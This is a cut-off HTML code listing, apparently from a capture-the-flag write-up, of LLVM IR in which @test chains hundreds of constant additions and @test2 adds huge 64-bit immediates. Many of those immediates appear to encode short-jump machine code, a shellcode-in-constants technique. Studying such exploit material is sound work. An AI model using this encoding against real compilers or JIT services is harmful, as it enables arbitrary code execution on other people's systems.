class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @test(i64 %0) #0 &#123;</span><br><span class="line">  %2 = add nsw i64 %0, 261593573097472</span><br><span class="line">  %3 = add nsw i64 %2, 256</span><br><span class="line">  %4 = add nsw i64 %3, 256</span><br><span class="line">  %5 = add nsw i64 %4, 256</span><br><span class="line">  %6 = add nsw i64 %5, 256</span><br><span class="line">  %7 = add nsw i64 %6, 256</span><br><span class="line">  %8 = add nsw i64 %7, 256</span><br><span class="line">  %9 = add nsw i64 %8, 256</span><br><span class="line">  %10 = add nsw i64 %9, 256</span><br><span class="line">  %11 = add nsw i64 %10, 256</span><br><span class="line">  %12 = add nsw i64 %11, 256</span><br><span class="line">  %13 = add nsw i64 %12, 256</span><br><span class="line">  %14 = add nsw i64 %13, 256</span><br><span class="line">  %15 = add nsw i64 %14, 256</span><br><span class="line">  %16 = add nsw i64 %15, 256</span><br><span class="line">  %17 = add nsw i64 %16, 256</span><br><span class="line">  %18 = add nsw i64 %17, 256</span><br><span class="line">  %19 = add nsw i64 %18, 256</span><br><span class="line">  %20 = add nsw i64 %19, 256</span><br><span class="line">  %21 = add nsw i64 %20, 256</span><br><span class="line">  %22 = add nsw i64 %21, 256</span><br><span class="line">  %23 = add nsw i64 %22, 256</span><br><span class="line">  %24 = add nsw i64 %23, 256</span><br><span class="line">  %25 = add nsw i64 %24, 256</span><br><span class="line">  %26 = add nsw i64 %25, 256</span><br><span class="line">  %27 = add nsw i64 %26, 256</span><br><span class="line">  %28 = add nsw i64 %27, 256</span><br><span class="line">  %29 = add nsw i64 %28, 256</span><br><span class="line">  %30 = add nsw i64 %29, 256</span><br><span class="line">  %31 = add nsw i64 %30, 256</span><br><span class="line">  %32 = add nsw i64 %31, 256</span><br><span class="line">  %33 = add nsw i64 %32, 256</span><br><span class="line">  %34 = add nsw i64 %33, 256</span><br><span class="line">  %35 = add nsw i64 %34, 256</span><br><span class="line">  %36 = add nsw i64 %35, 256</span><br><span class="line">  %37 = add nsw i64 %36, 256</span><br><span class="line">  %38 = add nsw i64 %37, 256</span><br><span class="line">  %39 = add nsw i64 %38, 256</span><br><span class="line">  %40 = add nsw i64 %39, 256</span><br><span class="line">  %41 = add nsw i64 %40, 256</span><br><span class="line">  %42 = add nsw i64 %41, 256</span><br><span class="line">  %43 = add nsw i64 %42, 256</span><br><span class="line">  %44 = add nsw i64 %43, 256</span><br><span class="line">  %45 = add nsw i64 %44, 256</span><br><span class="line">  %46 = add nsw i64 %45, 256</span><br><span class="line">  %47 = add nsw i64 %46, 256</span><br><span class="line">  %48 = add nsw i64 %47, 256</span><br><span class="line">  %49 = add nsw i64 %48, 256</span><br><span class="line">  %50 = add nsw i64 %49, 256</span><br><span class="line">  %51 = add nsw i64 %50, 256</span><br><span class="line">  %52 = add nsw i64 %51, 256</span><br><span class="line">  %53 = add nsw i64 %52, 256</span><br><span class="line">  %54 = add nsw i64 %53, 256</span><br><span class="line">  %55 = add nsw i64 %54, 256</span><br><span class="line">  %56 = add nsw i64 %55, 256</span><br><span class="line">  %57 = add nsw i64 %56, 256</span><br><span class="line">  %58 = add nsw i64 %57, 256</span><br><span class="line">  %59 = add nsw i64 %58, 256</span><br><span class="line">  %60 = add nsw i64 %59, 256</span><br><span class="line">  %61 = add nsw i64 %60, 256</span><br><span class="line">  %62 = add nsw i64 %61, 256</span><br><span class="line">  %63 = add nsw i64 %62, 256</span><br><span class="line">  %64 = add nsw i64 %63, 256</span><br><span class="line">  %65 = add nsw i64 %64, 256</span><br><span class="line">  %66 = add nsw i64 %65, 256</span><br><span class="line">  %67 = add nsw i64 %66, 256</span><br><span class="line">  %68 = add nsw i64 %67, 256</span><br><span class="line">  %69 = add nsw i64 %68, 256</span><br><span class="line">  %70 = add nsw i64 %69, 256</span><br><span class="line">  %71 = add nsw i64 %70, 256</span><br><span class="line">  %72 = add nsw i64 %71, 256</span><br><span class="line">  %73 = add nsw i64 %72, 256</span><br><span class="line">  %74 = add nsw i64 %73, 256</span><br><span class="line">  %75 = add nsw i64 %74, 256</span><br><span class="line">  %76 = add nsw i64 %75, 256</span><br><span class="line">  %77 = add nsw i64 %76, 256</span><br><span class="line">  %78 = add nsw i64 %77, 256</span><br><span class="line">  %79 = add nsw i64 %78, 256</span><br><span class="line">  %80 = add nsw i64 %79, 256</span><br><span class="line">  %81 = add nsw i64 %80, 256</span><br><span class="line">  %82 = add nsw i64 %81, 256</span><br><span class="line">  %83 = add nsw i64 %82, 256</span><br><span class="line">  %84 = add nsw i64 %83, 256</span><br><span class="line">  %85 = add nsw i64 %84, 256</span><br><span class="line">  %86 = add nsw i64 %85, 256</span><br><span class="line">  %87 = add nsw i64 %86, 256</span><br><span class="line">  %88 = add nsw i64 %87, 256</span><br><span class="line">  %89 = add nsw i64 %88, 256</span><br><span class="line">  %90 = add nsw i64 %89, 256</span><br><span class="line">  %91 = add nsw i64 %90, 256</span><br><span class="line">  %92 = add nsw i64 %91, 256</span><br><span class="line">  %93 = add nsw i64 %92, 256</span><br><span class="line">  %94 = add nsw i64 %93, 256</span><br><span class="line">  %95 = add nsw i64 %94, 256</span><br><span class="line">  %96 = add nsw i64 %95, 256</span><br><span class="line">  %97 = add nsw i64 %96, 256</span><br><span class="line">  %98 = add nsw i64 %97, 256</span><br><span class="line">  %99 = add nsw i64 %98, 256</span><br><span class="line">  %100 = add nsw i64 %99, 256</span><br><span class="line">  %101 = add nsw i64 %100, 256</span><br><span class="line">  %102 = add nsw i64 %101, 256</span><br><span class="line">  %103 = add nsw i64 %102, 256</span><br><span class="line">  %104 = add nsw i64 %103, 256</span><br><span class="line">  %105 = add nsw i64 %104, 256</span><br><span class="line">  %106 = add nsw i64 %105, 256</span><br><span class="line">  %107 = add nsw i64 %106, 256</span><br><span class="line">  %108 = add nsw i64 %107, 256</span><br><span class="line">  %109 = add nsw i64 %108, 256</span><br><span class="line">  %110 = add nsw i64 %109, 256</span><br><span class="line">  %111 = add nsw i64 %110, 256</span><br><span class="line">  %112 = add nsw i64 %111, 256</span><br><span class="line">  %113 = add nsw i64 %112, 256</span><br><span class="line">  %114 = add nsw i64 %113, 256</span><br><span class="line">  %115 = add nsw i64 %114, 256</span><br><span class="line">  %116 = add nsw i64 %115, 256</span><br><span class="line">  %117 = add nsw i64 %116, 256</span><br><span class="line">  %118 = add nsw i64 %117, 256</span><br><span class="line">  %119 = add nsw i64 %118, 256</span><br><span class="line">  %120 = add nsw i64 %119, 256</span><br><span class="line">  %121 = add nsw i64 %120, 256</span><br><span class="line">  %122 = add nsw i64 %121, 256</span><br><span class="line">  %123 = add nsw i64 %122, 256</span><br><span class="line">  %124 = add nsw i64 %123, 256</span><br><span class="line">  %125 = add nsw i64 %124, 256</span><br><span class="line">  %126 = add nsw i64 %125, 256</span><br><span class="line">  %127 = add nsw i64 %126, 256</span><br><span class="line">  %128 = add nsw i64 %127, 256</span><br><span class="line">  %129 = add nsw i64 %128, 256</span><br><span class="line">  %130 = add nsw i64 %129, 256</span><br><span class="line">  %131 = add nsw i64 %130, 256</span><br><span class="line">  %132 = add nsw i64 %131, 256</span><br><span class="line">  %133 = add nsw i64 %132, 256</span><br><span class="line">  %134 = add nsw i64 %133, 256</span><br><span class="line">  %135 = add nsw i64 %134, 256</span><br><span class="line">  %136 = add nsw i64 %135, 256</span><br><span class="line">  %137 = add nsw i64 %136, 256</span><br><span class="line">  %138 = add nsw i64 %137, 256</span><br><span class="line">  %139 = add nsw i64 %138, 256</span><br><span class="line">  %140 = add nsw i64 %139, 256</span><br><span class="line">  %141 = add nsw i64 %140, 256</span><br><span class="line">  %142 = add nsw i64 %141, 256</span><br><span class="line">  %143 = add nsw i64 %142, 256</span><br><span class="line">  %144 = add nsw i64 %143, 256</span><br><span class="line">  %145 = add nsw i64 %144, 256</span><br><span class="line">  %146 = add nsw i64 %145, 256</span><br><span class="line">  %147 = add nsw i64 %146, 256</span><br><span class="line">  %148 = add nsw i64 %147, 256</span><br><span class="line">  %149 = add nsw i64 %148, 256</span><br><span class="line">  %150 = add nsw i64 %149, 256</span><br><span class="line">  %151 = add nsw i64 %150, 256</span><br><span class="line">  %152 = add nsw i64 %151, 256</span><br><span class="line">  %153 = add nsw i64 %152, 256</span><br><span class="line">  %154 = add nsw i64 %153, 256</span><br><span class="line">  %155 = add nsw i64 %154, 256</span><br><span class="line">  %156 = add nsw i64 %155, 256</span><br><span class="line">  %157 = add nsw i64 %156, 256</span><br><span class="line">  %158 = add nsw i64 %157, 256</span><br><span class="line">  %159 = add nsw i64 %158, 256</span><br><span class="line">  %160 = add nsw i64 %159, 256</span><br><span class="line">  %161 = add nsw i64 %160, 256</span><br><span class="line">  %162 = add nsw i64 %161, 256</span><br><span class="line">  %163 = add nsw i64 %162, 256</span><br><span class="line">  %164 = add nsw i64 %163, 256</span><br><span class="line">  %165 = add nsw i64 %164, 256</span><br><span class="line">  %166 = add nsw i64 %165, 256</span><br><span class="line">  %167 = add nsw i64 %166, 256</span><br><span class="line">  %168 = add nsw i64 %167, 256</span><br><span class="line">  %169 = add nsw i64 %168, 256</span><br><span class="line">  %170 = add nsw i64 %169, 256</span><br><span class="line">  %171 = add nsw i64 %170, 256</span><br><span class="line">  %172 = add nsw i64 %171, 256</span><br><span class="line">  %173 = add nsw i64 %172, 256</span><br><span class="line">  %174 = add nsw i64 %173, 256</span><br><span class="line">  %175 = add nsw i64 %174, 256</span><br><span class="line">  %176 = add nsw i64 %175, 256</span><br><span class="line">  %177 = add nsw i64 %176, 256</span><br><span class="line">  %178 = add nsw i64 %177, 256</span><br><span class="line">  %179 = add nsw i64 %178, 256</span><br><span class="line">  %180 = add nsw i64 %179, 256</span><br><span class="line">  %181 = add nsw i64 %180, 256</span><br><span class="line">  %182 = add nsw i64 %181, 256</span><br><span class="line">  %183 = add nsw i64 %182, 256</span><br><span class="line">  %184 = add nsw i64 %183, 256</span><br><span class="line">  %185 = add nsw i64 %184, 256</span><br><span class="line">  %186 = add nsw i64 %185, 256</span><br><span class="line">  %187 = add nsw i64 %186, 256</span><br><span class="line">  %188 = add nsw i64 %187, 256</span><br><span class="line">  %189 = add nsw i64 %188, 256</span><br><span class="line">  %190 = add nsw i64 %189, 256</span><br><span class="line">  %191 = add nsw i64 %190, 256</span><br><span class="line">  %192 = add nsw i64 %191, 256</span><br><span class="line">  %193 = add nsw i64 %192, 256</span><br><span class="line">  %194 = add nsw i64 %193, 256</span><br><span class="line">  %195 = add nsw i64 %194, 256</span><br><span class="line">  %196 = add nsw i64 %195, 256</span><br><span class="line">  %197 = add nsw i64 %196, 256</span><br><span class="line">  %198 = add nsw i64 %197, 256</span><br><span class="line">  %199 = add nsw i64 %198, 256</span><br><span class="line">  %200 = add nsw i64 %199, 256</span><br><span class="line">  %201 = add nsw i64 %200, 256</span><br><span class="line">  %202 = add nsw i64 %201, 256</span><br><span class="line">  %203 = add nsw i64 %202, 256</span><br><span class="line">  %204 = add nsw i64 %203, 256</span><br><span class="line">  %205 = add nsw i64 %204, 256</span><br><span class="line">  %206 = add nsw i64 %205, 256</span><br><span class="line">  %207 = add nsw i64 %206, 256</span><br><span class="line">  %208 = add nsw i64 %207, 256</span><br><span class="line">  %209 = add nsw i64 %208, 256</span><br><span class="line">  %210 = add nsw i64 %209, 256</span><br><span class="line">  %211 = add nsw i64 %210, 256</span><br><span class="line">  %212 = add nsw i64 %211, 256</span><br><span class="line">  %213 = add nsw i64 %212, 256</span><br><span class="line">  %214 = add nsw i64 %213, 256</span><br><span class="line">  %215 = add nsw i64 %214, 256</span><br><span class="line">  %216 = add nsw i64 %215, 256</span><br><span class="line">  %217 = add nsw i64 %216, 256</span><br><span class="line">  %218 = add nsw i64 %217, 256</span><br><span class="line">  %219 = add nsw i64 %218, 256</span><br><span class="line">  %220 = add nsw i64 %219, 256</span><br><span class="line">  %221 = add nsw i64 %220, 256</span><br><span class="line">  %222 = add nsw i64 %221, 256</span><br><span class="line">  %223 = add nsw i64 %222, 256</span><br><span class="line">  %224 = add nsw i64 %223, 256</span><br><span class="line">  %225 = add nsw i64 %224, 256</span><br><span class="line">  %226 = add nsw i64 %225, 256</span><br><span class="line">  %227 = add nsw i64 %226, 256</span><br><span class="line">  %228 = add nsw i64 %227, 256</span><br><span class="line">  %229 = add nsw i64 %228, 256</span><br><span class="line">  %230 = add nsw i64 %229, 256</span><br><span class="line">  %231 = add nsw i64 %230, 256</span><br><span class="line">  %232 = add nsw i64 %231, 256</span><br><span class="line">  %233 = add nsw i64 %232, 256</span><br><span class="line">  %234 = add nsw i64 %233, 256</span><br><span class="line">  %235 = add nsw i64 %234, 256</span><br><span class="line">  %236 = add nsw i64 %235, 256</span><br><span class="line">  %237 = add nsw i64 %236, 256</span><br><span class="line">  %238 = add nsw i64 %237, 256</span><br><span class="line">  %239 = add nsw i64 %238, 256</span><br><span class="line">  %240 = add nsw i64 %239, 256</span><br><span class="line">  %241 = add nsw i64 %240, 256</span><br><span class="line">  %242 = add nsw i64 %241, 256</span><br><span class="line">  %243 = add nsw i64 %242, 256</span><br><span class="line">  %244 = add nsw i64 %243, 256</span><br><span class="line">  %245 = add nsw i64 %244, 256</span><br><span class="line">  %246 = add nsw i64 %245, 256</span><br><span class="line">  %247 = add nsw i64 %246, 256</span><br><span class="line">  %248 = add nsw i64 %247, 256</span><br><span class="line">  %249 = add nsw i64 %248, 256</span><br><span class="line">  %250 = add nsw i64 %249, 256</span><br><span class="line">  %251 = add nsw i64 %250, 256</span><br><span class="line">  %252 = add nsw i64 %251, 256</span><br><span class="line">  %253 = add nsw i64 %252, 256</span><br><span class="line">  %254 = add nsw i64 %253, 256</span><br><span class="line">  %255 = add nsw i64 %254, 256</span><br><span class="line">  %256 = add nsw i64 %255, 256</span><br><span class="line">  %257 = add nsw i64 %256, 256</span><br><span class="line">  %258 = add nsw i64 %257, 256</span><br><span class="line">  %259 = add nsw i64 %258, 256</span><br><span class="line">  %260 = add nsw i64 %259, 256</span><br><span class="line">  %261 = add nsw i64 %260, 256</span><br><span class="line">  %262 = add nsw i64 %261, 256</span><br><span class="line">  %263 = add nsw i64 %262, 256</span><br><span class="line">  %264 = add nsw i64 %263, 256</span><br><span class="line">  %265 = add nsw i64 %264, 256</span><br><span class="line">  %266 = add nsw i64 %265, 256</span><br><span class="line">  %267 = add nsw i64 %266, 256</span><br><span class="line">  %268 = add nsw i64 %267, 256</span><br><span class="line">  %269 = add nsw i64 %268, 256</span><br><span class="line">  %270 = add nsw i64 %269, 256</span><br><span class="line">  %271 = add nsw i64 %270, 256</span><br><span class="line">  %272 = add nsw i64 %271, 256</span><br><span class="line">  %273 = add nsw i64 %272, 256</span><br><span class="line">  %274 = add nsw i64 %273, 256</span><br><span class="line">  %275 = add nsw i64 %274, 256</span><br><span class="line">  %276 = add nsw i64 %275, 256</span><br><span class="line">  %277 = add nsw i64 %276, 256</span><br><span class="line">  %278 = add nsw i64 %277, 256</span><br><span class="line">  %279 = add nsw i64 %278, 256</span><br><span class="line">  %280 = add nsw i64 %279, 256</span><br><span class="line">  %281 = add nsw i64 %280, 256</span><br><span class="line">  %282 = add nsw i64 %281, 256</span><br><span class="line">  %283 = add nsw i64 %282, 256</span><br><span class="line">  %284 = add nsw i64 %283, 256</span><br><span class="line">  %285 = add nsw i64 %284, 256</span><br><span class="line">  %286 = add nsw i64 %285, 256</span><br><span class="line">  %287 = add nsw i64 %286, 256</span><br><span class="line">  %288 = add nsw i64 %287, 256</span><br><span class="line">  %289 = add nsw i64 %288, 256</span><br><span class="line">  %290 = add nsw i64 %289, 256</span><br><span class="line">  %291 = add nsw i64 %290, 256</span><br><span class="line">  %292 = add nsw i64 %291, 256</span><br><span class="line">  %293 = add nsw i64 %292, 256</span><br><span class="line">  %294 = add nsw i64 %293, 256</span><br><span class="line">  %295 = add nsw i64 %294, 256</span><br><span class="line">  %296 = add nsw i64 %295, 256</span><br><span class="line">  %297 = add nsw i64 %296, 256</span><br><span class="line">  %298 = add nsw i64 %297, 256</span><br><span class="line">  %299 = add nsw i64 %298, 256</span><br><span class="line">  %300 = add nsw i64 %299, 256</span><br><span class="line">  %301 = add nsw i64 %300, 256</span><br><span class="line">  %302 = add nsw i64 %301, 256</span><br><span class="line">  %303 = add nsw i64 %302, 256</span><br><span class="line">  %304 = add nsw i64 %303, 256</span><br><span class="line">  %305 = add nsw i64 %304, 256</span><br><span class="line">  %306 = add nsw i64 %305, 256</span><br><span class="line">  %307 = add nsw i64 %306, 256</span><br><span class="line">  %308 = add nsw i64 %307, 256</span><br><span class="line">  %309 = add nsw i64 %308, 256</span><br><span class="line">  %310 = add nsw i64 %309, 256</span><br><span class="line">  %311 = add nsw i64 %310, 256</span><br><span class="line">  %312 = add nsw i64 %311, 256</span><br><span class="line">  %313 = add nsw i64 %312, 256</span><br><span class="line">  %314 = add nsw i64 %313, 1</span><br><span class="line">  %315 = add nsw i64 %314, 1</span><br><span class="line">  %316 = add nsw i64 %315, 1</span><br><span class="line">  %317 = add nsw i64 %316, 256</span><br><span class="line">  ret i64 %317</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define dso_local i64 @test2(i64 %0) #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 1</span><br><span class="line">  %3 = add nsw i64 %2, 1</span><br><span class="line">  %4 = add nsw i64 %3, 1</span><br><span class="line">  %5 = add nsw i64 %4, 16999840169015142506</span><br><span class="line">  %6 = add nsw i64 %5, 16999840042827329464</span><br><span class="line">  %7 = add nsw i64 %6, 16999840167141359944</span><br><span class="line">  %8 = add nsw i64 %7, 16999802617337939272</span><br><span class="line">  %9 = add nsw i64 %8, 16999840169015152720</span><br><span class="line">  %10 = add 